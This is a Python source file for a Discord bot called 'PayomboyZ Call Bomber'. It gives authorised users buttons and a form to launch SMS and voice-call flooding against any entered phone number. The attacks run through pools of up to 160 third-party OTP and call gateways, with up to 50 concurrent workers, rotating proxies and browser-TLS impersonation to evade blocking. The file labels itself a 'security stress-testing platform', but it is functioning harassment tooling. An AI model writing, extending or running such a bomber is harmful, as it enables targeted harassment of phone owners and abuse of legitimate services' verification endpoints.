import os
import asyncio
import aiohttp
import discord
from discord import ui
from typing import Optional, List, Tuple, Any

from bot.security import SecurityGuard
from core.phone import PhoneNumber
from core.provider import ProviderLoader, Provider
from core.engine import AttackEngine, HAS_CURL_CFFI
from core.proxy import ProxyManager
from core.exporter import ProviderExporter
from core.settings import SettingsManager

PROVIDERS_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "config", "providers.json")
VERIFIED_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "config", "verified_providers.json")
PROXIES_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxies.txt")

BASE_DIR = os.path.dirname(os.path.dirname(__file__))
BANNER_CARD1 = os.path.join(BASE_DIR, "payomboyz_green_balaclava_core.gif")
BANNER_CARD2 = os.path.join(BASE_DIR, "payomboyz_green_balaclava_strike.gif")

def get_active_banner_path() -> Optional[str]:
    choice = SettingsManager.get_active_banner()
    p = BANNER_CARD2 if choice == "card2" else BANNER_CARD1
    return p if os.path.exists(p) else None

current_engine_instance: Optional[AttackEngine] = None

def get_active_providers_file() -> str:
    pool_choice = SettingsManager.get_active_pool()
    if pool_choice == "master":
        if os.path.exists(PROVIDERS_FILE):
            return PROVIDERS_FILE
    return VERIFIED_FILE if os.path.exists(VERIFIED_FILE) else PROVIDERS_FILE

def build_panel_embed() -> discord.Embed:
    active_file = get_active_providers_file()
    active_pool_name = SettingsManager.get_active_pool()
    providers = ProviderLoader.load(active_file)
    call_count = len([p for p in providers if p.type == "call"])
    sms_count = len([p for p in providers if p.type == "sms"])
    
    is_busy = SecurityGuard.is_engine_busy()
    state_badge = "🔴 BUSY (RUNNING ATTACK)" if is_busy else "🟢 IDLE (READY)"
    target_info = SecurityGuard.get_active_target() or "None"
    tls_engine = "curl_cffi (Chrome124 Stealth)" if HAS_CURL_CFFI else "httpx (Standard OpenSSL)"

    total_master = 0
    try:
        total_master = len(ProviderLoader.load(PROVIDERS_FILE))
    except Exception:
        total_master = len(providers)

    total_verified = 0
    try:
        total_verified = len(ProviderLoader.load(VERIFIED_FILE))
    except Exception:
        total_verified = 13

    output_ch_id = SettingsManager.get_output_channel_id()
    channel_display = f"<#{output_ch_id}>" if output_ch_id else "`Default (Current Channel)`"
    pool_badge = "🔥 Master Matrix (160 Endpoints)" if active_pool_name == "master" else "⚡ Verified High-Yield (13 Endpoints)"

    embed = discord.Embed(
        title="⚡ PAYOMBOY CALL BOMBER — CONTROL PANEL ⚡",
        description="**Advanced Telephony & SMS Security Stress-Testing Platform**\nAuthorized Operators Only.",
        color=0xff0033 if is_busy else 0x00ffcc
    )
    embed.add_field(name="Engine State", value=f"`{state_badge}`", inline=True)
    embed.add_field(name="Active Target", value=f"`{target_info}`", inline=True)
    embed.add_field(name="TLS Engine", value=f"`{tls_engine}`", inline=True)
    
    embed.add_field(name="📍 Output Channel", value=channel_display, inline=True)
    embed.add_field(name="🎯 Active Pool Mode", value=f"**{pool_badge}**", inline=True)
    embed.add_field(name="📦 Loaded in Memory", value=f"`{len(providers)} providers`", inline=True)

    embed.add_field(
        name="Provider Matrix Overview",
        value=(
            f"• **Verified Core**: `{total_verified}` gateways (100% Delivery Rate)\n"
            f"• **Master Pool**: `{total_master}` gateways (Full Thai & Multi Matrix)\n"
            f"• **Active Breakdown**: Voice: `{call_count}` | SMS: `{sms_count}`\n"
            f"• **Pacing**: SMS 0.5s-2s / Voice 10s cooldown"
        ),
        inline=False
    )

    embed.add_field(
        name="Quick Controls Guide",
        value=(
            "🚀 **Start Attack** → Enter phone & trigger concurrency waves\n"
            "🔄 **Switch Pool** → Toggle between 13 Verified and 160 Master Matrix\n"
            "📊 **Status** → Inspect engine state & telephony latency\n"
            "🔍 **Health Audit** → Re-benchmark live endpoints & auto-prune\n"
            "📋 **View Pool** → List loaded SMS & Voice gateways"
        ),
        inline=False
    )

    embed.set_footer(text="PayomboyZ RedTeam Security • Zero-Attachment Policy • Use /attack or /set_channel")
    
    banner_path = get_active_banner_path()
    if banner_path and os.path.exists(banner_path):
        embed.set_image(url="attachment://banner.gif")

    return embed


DEFAULT_BOMBER_BANNER_URL = "https://cdn.discordapp.com/attachments/1565150107513520179/1565169276741226659/banner.gif"

def build_bomber_v2_payload(banner_url: Optional[str] = None) -> dict:
    """Builds Discord Components V2 Container message (flags: 32768) matching the expanded Auto Quest layout."""
    active_file = get_active_providers_file()
    active_pool_name = SettingsManager.get_active_pool()
    providers = ProviderLoader.load(active_file)
    call_count = len([p for p in providers if p.type == "call"])
    sms_count = len([p for p in providers if p.type == "sms"])

    is_busy = SecurityGuard.is_engine_busy()
    state_badge = "🔴 BUSY (RUNNING ATTACK)" if is_busy else "🟢 IDLE (READY)"
    target_info = SecurityGuard.get_active_target() or "None"
    tls_engine = "curl_cffi (Chrome124 Stealth)" if HAS_CURL_CFFI else "httpx (Standard OpenSSL)"

    total_master = 0
    try:
        total_master = len(ProviderLoader.load(PROVIDERS_FILE))
    except Exception:
        total_master = len(providers)

    total_verified = 0
    try:
        total_verified = len(ProviderLoader.load(VERIFIED_FILE))
    except Exception:
        total_verified = 16

    output_ch_id = SettingsManager.get_output_channel_id()
    channel_display = f"<#{output_ch_id}>" if output_ch_id else "`Default (Current Channel)`"
    pool_badge = "🔥 Master Matrix (160 Endpoints)" if active_pool_name == "master" else "⚡ Verified High-Yield (13 Endpoints)"

    body_text = (
        "> <:payomboyz:1551064225974325318> **ระบบทดสอบความทนทานต่อสแปมเบอร์โทรศัพท์และ SMS ความเร็วสูง (RedTeam Stress-Testing)**\n"
        f"> 🛡️ **Engine State:** `{state_badge}` • **TLS Engine:** `{tls_engine}`\n"
        f"> 🎯 **Active Target:** `{target_info}` • **Output Channel:** {channel_display}\n"
        f"> 📦 **Active Pool Mode:** **{pool_badge}** (`{len(providers)} providers`)\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📊 **Provider Matrix Overview:**\n"
        f"• **Verified Core:** `{total_verified}` gateways (100% Delivery Rate)\n"
        f"• **Master Pool:** `{total_master}` gateways (Full Thai & Multi Matrix)\n"
        f"• **Active Breakdown:** Voice: `{call_count}` | SMS: `{sms_count}`\n"
        "• **Pacing:** SMS 0.5s-2s / Voice 10s cooldown\n\n"
        "🕹️ **Quick Controls Guide:**\n"
        "• 🚀 **Start Attack** → ป้อนเบอร์โทรศัพท์เป้าหมายและเริ่มยิงสลับโหมด Call / SMS\n"
        "• 🔄 **Switch Pool** → สลับระหว่าง Verified Core (16) และ Master Matrix (58/160)\n"
        "• 📊 **Status** → ตรวจสอบสถานะและ Latency ของเกตเวย์\n"
        "• 🔍 **Health Audit** → ตรวจสอบความพร้อมของเกตเวย์ทั้งหมดและตัดตัวที่ตายออก\n"
        "• 📋 **View Pool** → ดูรายชื่อผู้ให้บริการ SMS / Call ทั้งหมดในระบบ"
    )

    media_banner = banner_url or DEFAULT_BOMBER_BANNER_URL
    color_val = 0xff0033 if is_busy else 65484

    return {
        "flags": 32768,
        "embeds": [],
        "components": [
            {
                "type": 17,
                "accent_color": color_val,
                "components": [
                    {
                        "type": 10,
                        "content": "## <a:pbg_wing_l:1562553182859563150> **PAYOMBOY CALL BOMBER — CONTROL PANEL** <a:pbg_wing_r:1562553185325940748>\n### ⚡ **ADVANCED TELEPHONY & SMS SECURITY STRESS-TESTING PLATFORM**"
                    },
                    {"type": 14, "divider": True, "spacing": 1},
                    {
                        "type": 10,
                        "content": body_text
                    },
                    {"type": 14, "divider": True, "spacing": 1},
                    {
                        "type": 1,
                        "components": [
                            {
                                "type": 2,
                                "custom_id": "btn_start_attack",
                                "style": 4,
                                "label": "Start Attack",
                                "emoji": {"name": "🚀"}
                            },
                            {
                                "type": 2,
                                "custom_id": "btn_toggle_pool",
                                "style": 2,
                                "label": "Switch Pool",
                                "emoji": {"name": "🔄"}
                            },
                            {
                                "type": 2,
                                "custom_id": "btn_status",
                                "style": 2,
                                "label": "Status",
                                "emoji": {"name": "📊"}
                            }
                        ]
                    },
                    {
                        "type": 1,
                        "components": [
                            {
                                "type": 2,
                                "custom_id": "btn_health_audit",
                                "style": 2,
                                "label": "Health Audit",
                                "emoji": {"name": "🔍"}
                            },
                            {
                                "type": 2,
                                "custom_id": "btn_view_pool",
                                "style": 2,
                                "label": "View Pool",
                                "emoji": {"name": "📋"}
                            },
                            {
                                "type": 2,
                                "custom_id": "btn_refresh_panel",
                                "style": 2,
                                "label": "Refresh",
                                "emoji": {"name": "🔄"}
                            }
                        ]
                    },
                    {"type": 14, "divider": True, "spacing": 1},
                    {
                        "type": 10,
                        "content": "**POWERED BY PAYOMBØYZ TELEPHONY ENGINE • ZERO-ATTACHMENT ARCHITECTURE**"
                    },
                    {"type": 14, "divider": True, "spacing": 1},
                    {
                        "type": 12,
                        "items": [
                            {
                                "media": {
                                    "url": media_banner,
                                    "width": 960,
                                    "height": 540
                                }
                            }
                        ]
                    }
                ]
            }
        ]
    }


async def send_bomber_v2_panel(channel_id: int, bot_token: Optional[str] = None, banner_url: Optional[str] = None) -> Tuple[bool, Any]:
    token = bot_token or os.environ.get("DISCORD_TOKEN")
    if not token:
        return False, "No bot token provided"
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json",
        "User-Agent": "DiscordBot (https://github.com/Payomboyz0028/PayomboyCallBomber, 1.0)"
    }
    payload = build_bomber_v2_payload(banner_url=banner_url)
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as r:
            try:
                data = await r.json()
            except Exception:
                data = await r.text()
            return r.status in (200, 201), data


async def edit_bomber_v2_panel(channel_id: int, message_id: int, bot_token: Optional[str] = None, banner_url: Optional[str] = None) -> Tuple[bool, Any]:
    token = bot_token or os.environ.get("DISCORD_TOKEN")
    if not token:
        return False, "No bot token provided"
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages/{message_id}"
    headers = {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json",
        "User-Agent": "DiscordBot (https://github.com/Payomboyz0028/PayomboyCallBomber, 1.0)"
    }
    payload = build_bomber_v2_payload(banner_url=banner_url)
    async with aiohttp.ClientSession() as session:
        async with session.patch(url, headers=headers, json=payload) as r:
            try:
                data = await r.json()
            except Exception:
                data = await r.text()
            return r.status == 200, data


class AttackModal(ui.Modal, title="⚡ Launch Telephony Stress Test"):
    target_input = ui.TextInput(
        label="Target Phone Number",
        placeholder="e.g. 0812345678 or +66812345678",
        min_length=8,
        max_length=16,
        required=True
    )
    mode_input = ui.TextInput(
        label="Attack Mode (all / call / sms)",
        placeholder="all = Call & SMS | call = Voice Only | sms = SMS Only",
        default="all",
        max_length=4,
        required=True
    )
    rounds_input = ui.TextInput(
        label="Rounds (Max 50)",
        placeholder="1",
        default="1",
        max_length=2,
        required=False
    )
    concurrency_input = ui.TextInput(
        label="Concurrency Workers (Max 50)",
        placeholder="10",
        default="10",
        max_length=2,
        required=False
    )

    async def on_submit(self, interaction: discord.Interaction):
        global current_engine_instance

        # 1. Authorization Check
        if not SecurityGuard.is_authorized(interaction):
            return await interaction.response.send_message(
                "❌ **Access Denied**: You do not have permission to execute this operation.",
                ephemeral=True
            )

        # 2. Busy State Check
        if SecurityGuard.is_engine_busy():
            return await interaction.response.send_message(
                "⚠️ **Engine Busy**: An operation is currently running. Please wait or click Stop.",
                ephemeral=True
            )

        # 3. User Cooldown Check
        is_ready, remaining = SecurityGuard.check_cooldown(interaction.user.id)
        if not is_ready:
            return await interaction.response.send_message(
                f"⏳ **Rate Limited**: Please wait **{remaining:.1f}s** before launching another test.",
                ephemeral=True
            )

        # 4. Input Sanitization
        is_valid, clean_phone, err = SecurityGuard.sanitize_phone(self.target_input.value)
        if not is_valid:
            return await interaction.response.send_message(f"❌ **Input Error**: {err}", ephemeral=True)

        mode = self.mode_input.value.strip().lower()
        if mode not in ("all", "call", "sms"):
            mode = "all"

        try:
            raw_rounds = int(self.rounds_input.value.strip() or "1")
        except ValueError:
            raw_rounds = 1

        try:
            raw_conc = int(self.concurrency_input.value.strip() or "8")
        except ValueError:
            raw_conc = 8

        rounds, concurrency = SecurityGuard.validate_attack_params(raw_rounds, raw_conc)

        SecurityGuard.trigger_cooldown(interaction.user.id)
        SecurityGuard.set_engine_state(True, target=clean_phone)

        out_ch_id = SettingsManager.get_output_channel_id()
        ch_mention = f"<#{out_ch_id}>" if out_ch_id else "this channel"

        await interaction.response.send_message(
            f"🚀 **Attack Dispatched!**\nTarget: `{clean_phone}` | Mode: `{mode.upper()}` | Rounds: `{rounds}` | Workers: `{concurrency}`\n📍 Results will post in: {ch_mention}",
            ephemeral=True
        )

        asyncio.create_task(self._run_attack_task(interaction, clean_phone, mode, rounds, concurrency))

    async def _run_attack_task(self, interaction: discord.Interaction, phone_str: str, mode: str, rounds: int, concurrency: int):
        global current_engine_instance
        trace_logs: List[str] = []

        def on_endpoint_result(prov: Provider, success: bool, status_code: int, latency_ms: float, error_msg: Optional[str]):
            badge = "🟢 OK" if success else f"🔴 FAIL ({error_msg or status_code})"
            type_tag = "[CALL]" if prov.type == "call" else "[SMS]"
            trace_logs.append(f"{type_tag} `{prov.name[:20]:<20}` {badge} `{latency_ms:.0f}ms`")

        try:
            phone = PhoneNumber(phone_str)
            active_file = get_active_providers_file()
            providers = ProviderLoader.load(active_file)
            proxy_mgr = ProxyManager(PROXIES_FILE)

            engine = AttackEngine(
                providers=providers,
                phone=phone,
                mode=mode,
                max_concurrency=concurrency,
                proxy_manager=proxy_mgr,
                on_result=on_endpoint_result,
                use_stealth=True
            )
            current_engine_instance = engine
            await engine.run(rounds=rounds, delay_between_rounds=0.5)

            stats = engine.stats
            
            if stats.total_sent == 0:
                title = "❌ Telephony Test Failed (0 Requests Dispatched)"
                color = 0xff0000
            elif stats.success == 0:
                title = "⚠️ Telephony Test Completed — 0 Delivered (All Rejected / Blocked)"
                color = 0xff3333
            elif stats.failed > 0:
                title = f"⚡ Telephony Test Completed ({stats.success}/{stats.total_sent} Delivered)"
                color = 0xffaa00
            else:
                title = "✅ Telephony Test Completed (100% Delivered)"
                color = 0x00ff88

            summary_embed = discord.Embed(title=title, color=color)
            summary_embed.add_field(name="Target", value=f"`{phone.formatted_local}`", inline=True)
            summary_embed.add_field(name="Mode", value=f"`{mode.upper()}`", inline=True)
            summary_embed.add_field(name="Requests Sent", value=f"**{stats.total_sent}**", inline=True)
            summary_embed.add_field(name="Successful", value=f"🟢 **{stats.success}**", inline=True)
            summary_embed.add_field(name="Failed", value=f"🔴 **{stats.failed}**", inline=True)
            summary_embed.add_field(name="Voice Calls", value=f"`{stats.call_success} OK / {stats.call_failed} Fail`", inline=True)
            summary_embed.add_field(name="SMS OTPs", value=f"`{stats.sms_success} OK / {stats.sms_failed} Fail`", inline=True)
            summary_embed.add_field(name="Elapsed Time", value=f"`{stats.elapsed:.2f}s`", inline=True)
            summary_embed.add_field(name="Throughput Speed", value=f"`{stats.req_per_sec:.2f} req/s`", inline=True)

            if trace_logs:
                trace_sample = "\n".join(trace_logs[:15])
                if len(trace_logs) > 15:
                    trace_sample += f"\n*...and {len(trace_logs) - 15} more responses*"
                summary_embed.add_field(name="Endpoint Trace (Real Live Responses)", value=trace_sample, inline=False)

            # Check if designated output channel exists
            out_ch_id = SettingsManager.get_output_channel_id()
            dest_channel = None
            if out_ch_id and interaction.client:
                dest_channel = interaction.client.get_channel(out_ch_id)

            if dest_channel:
                await dest_channel.send(embed=summary_embed)
                try:
                    await interaction.channel.send(
                        f"✅ **Stress-Test Finished**: Telemetry report dispatched to {dest_channel.mention}!",
                        delete_after=15
                    )
                except Exception:
                    pass
            else:
                await interaction.channel.send(embed=summary_embed)

        except Exception as e:
            try:
                await interaction.channel.send(f"❌ **Execution Error**: `{str(e)[:100]}`")
            except Exception:
                pass
        finally:
            current_engine_instance = None
            SecurityGuard.set_engine_state(False, None)


class ChannelSelectView(ui.View):
    def __init__(self):
        super().__init__(timeout=60)

    @ui.select(
        cls=ui.ChannelSelect,
        placeholder="Select a text channel for output results...",
        channel_types=[discord.ChannelType.text]
    )
    async def select_channel(self, interaction: discord.Interaction, select: ui.ChannelSelect):
        if not SecurityGuard.is_admin(interaction):
            return await interaction.response.send_message("❌ **Access Denied**: Administrator permission required.", ephemeral=True)
        
        selected_channel = select.values[0]
        SettingsManager.set_output_channel_id(selected_channel.id)
        
        await interaction.response.send_message(
            f"✅ **Output Channel Bound**: All stress-test summaries & logs will now broadcast to {selected_channel.mention}!\n*Click Refresh on the control panel to see the update.*",
            ephemeral=True
        )


class ControlPanelView(ui.View):
    def __init__(self):
        super().__init__(timeout=None) # Persistent view

    @ui.button(label="🚀 Start Attack", style=discord.ButtonStyle.danger, custom_id="btn_start_attack", row=0)
    async def btn_start_attack(self, interaction: discord.Interaction, button: ui.Button):
        if not SecurityGuard.is_authorized(interaction):
            allowed_ch = SettingsManager.get_allowed_channels()
            ch_hint = f" Please use in {', '.join(f'<#{cid}>' for cid in allowed_ch)}." if allowed_ch else ""
            return await interaction.response.send_message(
                f"❌ **Access Denied**: Unauthorized user or channel.{ch_hint}", ephemeral=True
            )
        await interaction.response.send_modal(AttackModal())

    @ui.button(label="🔄 Switch Pool", style=discord.ButtonStyle.secondary, custom_id="btn_toggle_pool", row=0)
    async def btn_toggle_pool(self, interaction: discord.Interaction, button: ui.Button):
        if not SecurityGuard.is_authorized(interaction):
            return await interaction.response.send_message("❌ **Access Denied**: Unauthorized user.", ephemeral=True)
        
        current = SettingsManager.get_active_pool()
        new_pool = "master" if current == "verified" else "verified"
        SettingsManager.set_active_pool(new_pool)
        
        try:
            await interaction.response.defer()
            token = interaction.client.http.token if interaction.client and interaction.client.http else None
            ok, _ = await edit_bomber_v2_panel(interaction.channel_id, interaction.message.id, bot_token=token)
            if not ok:
                embed = build_panel_embed()
                await interaction.edit_original_response(embed=embed, view=self)
        except Exception:
            embed = build_panel_embed()
            await interaction.response.edit_message(embed=embed, view=self)

    @ui.button(label="📊 Status", style=discord.ButtonStyle.secondary, custom_id="btn_status", row=0)
    async def btn_status(self, interaction: discord.Interaction, button: ui.Button):
        active_file = get_active_providers_file()
        providers = ProviderLoader.load(active_file)
        call_count = len([p for p in providers if p.type == "call"])
        sms_count = len([p for p in providers if p.type == "sms"])
        tls = "curl_cffi Chrome124" if HAS_CURL_CFFI else "httpx (plain TLS)"
        out_ch_id = SettingsManager.get_output_channel_id()
        ch_mention = f"<#{out_ch_id}>" if out_ch_id else "`Current Channel`"

        embed = discord.Embed(title="📊 System Status & Telemetry", color=0x00ccff)
        embed.add_field(name="Engine", value="`BUSY`" if SecurityGuard.is_engine_busy() else "`IDLE`", inline=True)
        embed.add_field(name="Target", value=f"`{SecurityGuard.get_active_target() or 'None'}`", inline=True)
        embed.add_field(name="TLS Engine", value=f"`{tls}`", inline=True)
        embed.add_field(name="Active Pool", value=f"`{SettingsManager.get_active_pool().upper()}`", inline=True)
        embed.add_field(name="Loaded Providers", value=f"`{len(providers)} total`", inline=True)
        embed.add_field(name="Output Channel", value=ch_mention, inline=True)
        embed.add_field(name="Voice Gateways", value=f"`{call_count}`", inline=True)
        embed.add_field(name="SMS Gateways", value=f"`{sms_count}`", inline=True)
        embed.add_field(name="Pacing Cooldown", value="`SMS 0.5s / Voice 10s`", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @ui.button(label="🔍 Health Audit", style=discord.ButtonStyle.secondary, custom_id="btn_health_audit", row=1)
    async def btn_health_audit(self, interaction: discord.Interaction, button: ui.Button):
        if not SecurityGuard.is_authorized(interaction):
            return await interaction.response.send_message(
                "❌ **Access Denied**: Unauthorized user.", ephemeral=True
            )

        if SecurityGuard.is_engine_busy():
            return await interaction.response.send_message(
                "⚠️ **Engine Busy**: An operation is currently active.", ephemeral=True
            )

        await interaction.response.defer(ephemeral=True)
        SecurityGuard.set_engine_state(True, target="AUDIT_BENCHMARK")

        audit_trace: List[str] = []
        alive_names: List[str] = []

        def on_audit_result(prov: Provider, success: bool, status_code: int, latency_ms: float, error_msg: Optional[str]):
            badge = "🟢 OK" if success else f"🔴 FAIL ({error_msg or status_code})"
            type_tag = "[CALL]" if prov.type == "call" else "[SMS]"
            audit_trace.append(f"{type_tag} `{prov.name[:18]:<18}` {badge}")
            if success:
                alive_names.append(prov.name)

        try:
            providers = ProviderLoader.load(PROVIDERS_FILE)
            phone = PhoneNumber("0812345678")
            engine = AttackEngine(
                providers=providers,
                phone=phone,
                mode="all",
                max_concurrency=4,
                on_result=on_audit_result,
                use_stealth=True
            )
            await engine.run(rounds=1, delay_between_rounds=0)
            stats = engine.stats

            if len(alive_names) >= 5:
                ProviderExporter.export_verified(providers, alive_names, VERIFIED_FILE)

            embed = discord.Embed(
                title="🔍 Provider Health Audit Report",
                description=f"Benchmark finished. {len(alive_names)} verified alive.",
                color=0x3399ff
            )
            embed.add_field(name="Endpoints Scanned", value=str(stats.total_sent), inline=True)
            embed.add_field(name="Alive (Verified)", value=f"🟢 **{stats.success}**", inline=True)
            embed.add_field(name="Blocked / Dead", value=f"🔴 **{stats.failed}**", inline=True)
            embed.add_field(name="Voice Call Gateways", value=f"`{stats.call_success} OK / {stats.call_failed} Fail`", inline=True)
            embed.add_field(name="SMS Gateways", value=f"`{stats.sms_success} OK / {stats.sms_failed} Fail`", inline=True)
            embed.add_field(name="Audit Time", value=f"`{stats.elapsed:.2f}s`", inline=True)

            if audit_trace:
                sample = "\n".join(audit_trace[:15])
                if len(audit_trace) > 15:
                    sample += f"\n*...and {len(audit_trace) - 15} more*"
                embed.add_field(name="Gateway Health Sample", value=sample, inline=False)

            await interaction.followup.send(embed=embed, ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ **Audit Failed**: `{str(e)[:100]}`", ephemeral=True)
        finally:
            SecurityGuard.set_engine_state(False, None)

    @ui.button(label="📋 View Pool", style=discord.ButtonStyle.secondary, custom_id="btn_view_pool", row=1)
    async def btn_view_pool(self, interaction: discord.Interaction, button: ui.Button):
        active_file = get_active_providers_file()
        providers = ProviderLoader.load(active_file)
        lines = []
        for p in providers[:30]:
            badge = "📞" if p.type == "call" else "💬"
            lines.append(f"{badge} `{p.name}` ({p.method})")
        value = "\n".join(lines) if lines else "No providers loaded"
        if len(providers) > 30:
            value += f"\n*...and {len(providers) - 30} more endpoints in pool*"
        
        pool_name = SettingsManager.get_active_pool().upper()
        embed = discord.Embed(title=f"📋 Active Provider Pool [{pool_name}]", color=0x00ffcc)
        embed.add_field(name=f"Total Loaded: {len(providers)}", value=value, inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @ui.button(label="🔄 Refresh", style=discord.ButtonStyle.secondary, custom_id="btn_refresh_panel", row=1)
    async def btn_refresh_panel(self, interaction: discord.Interaction, button: ui.Button):
        try:
            await interaction.response.defer()
            token = interaction.client.http.token if interaction.client and interaction.client.http else None
            ok, _ = await edit_bomber_v2_panel(interaction.channel_id, interaction.message.id, bot_token=token)
            if not ok:
                embed = build_panel_embed()
                await interaction.edit_original_response(embed=embed, view=self)
        except Exception:
            embed = build_panel_embed()
            await interaction.response.edit_message(embed=embed, view=self)
